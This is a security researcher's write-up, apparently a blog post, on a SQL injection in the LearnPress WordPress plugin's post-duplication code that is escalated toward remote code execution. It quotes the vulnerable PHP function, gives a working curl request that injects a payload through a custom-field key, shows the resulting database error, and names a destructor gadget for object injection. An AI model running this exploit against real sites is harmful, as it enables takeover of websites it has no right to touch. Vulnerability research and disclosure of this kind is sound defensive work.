# LearnPress SQLi to RCE 

Few months back security research regarding WP learning platforms got my attention. (https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/)

From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE.

## Eli5 PoC 

Into function `learn_press_duplicate_post_meta` which is called from `learn_press_duplicate_post` we have the following:
```
	function learn_press_duplicate_post_meta( $old_post_id, $new_post_id, $excerpt = array() ) {
		global $wpdb;
		$post_meta_infos = $wpdb->get_results( "SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$old_post_id" );
		if ( count( $post_meta_infos ) != 0 ) {
			$excerpt       = array_merge( array( '_edit_lock', '_edit_last' ), $excerpt );
			$excerpt       = apply_filters( 'learn_press_excerpt_duplicate_post_meta', $excerpt, $old_post_id, $new_post_id );
			$sql_query     = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
			$sql_query_sel = array();
			foreach ( $post_meta_infos as $meta ) {
				if ( in_array( $meta->meta_key, $excerpt ) ) {
					continue;
				}
				if ( $meta->meta_key === '_lp_course_author' ) {
					$meta->meta_value = get_current_user_id();
				}
				$meta_key        = $meta->meta_key;
				$meta_value      = addslashes( $meta->meta_value );
				$sql_query_sel[] = "SELECT $new_post_id, '$meta_key', '$meta_value'";
			}
			$sql_query .= implode( " UNION ALL ", $sql_query_sel );
			$wpdb->query( $sql_query );
		}
	}
```  
From previous reports `$meta_value` was reported as SQLi vulnerable parameter, but `$meta_key` wasn't?!
Having on mind that we talk about WP then we all know that if we have permissions to edit post, then we have permissions to add custom fields (meta fields)
```
curl 'http://local.setup/wp-admin/admin-ajax.php' --data $'_ajax_nonce=0&action=add-meta&metakeyselect=%23NONE%23&metakeyinput=sqli\'payload&metavalue=anything&_ajax_nonce-add-meta=47cfdb164d&post_id=[lesson_id]'
```
In order to execute the SQLi and to be able to insert custom/meta field with any meta value, we need only to duplicate the lesson. Then we have the following :)
```
[Tue Jul 21 22:16:08.289659 2020] [:error] [pid 24069] [client ::1:47077] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 'boom'' at line 1 for query INSERT INTO wp_postmeta (post_id, meta_key, meta_value) SELECT 107, 'count_items', '0' UNION ALL SELECT 107, '_lp_duration', '30 minute' UNION ALL SELECT 107, '_lp_preview', 'no' UNION ALL SELECT 107, 'boom'test', 'boom' made by require_once('wp-admin/admin.php')... LP_Lesson_CURD->duplicate, learn_press_duplicate_post, learn_press_duplicate_post_meta
```
What we can achieve with possibility to insert any meta value? Well that depends of plugin itself and WP setup. If we check the LearnPress code then we can notice following in `learnpress.php`:
```
require_once 'inc/class-lp-debug.php';
```
and this is important because:
```
public function __destruct() {
		if ( ! $this->_handles ) {
			return;
		}
		foreach ( $this->_handles as $handle ) {
			@fclose( $handle );
		}
	}
```
e.g. same situation as WooCommerce => hello RCE :)

## Few facts

- I tried to warn researchers 
- Do not allow interesting gadget chains in your PHP code
- Limit what could be unserialized in your php.ini

## Remediation

- Do not allow SQLi in your code :)


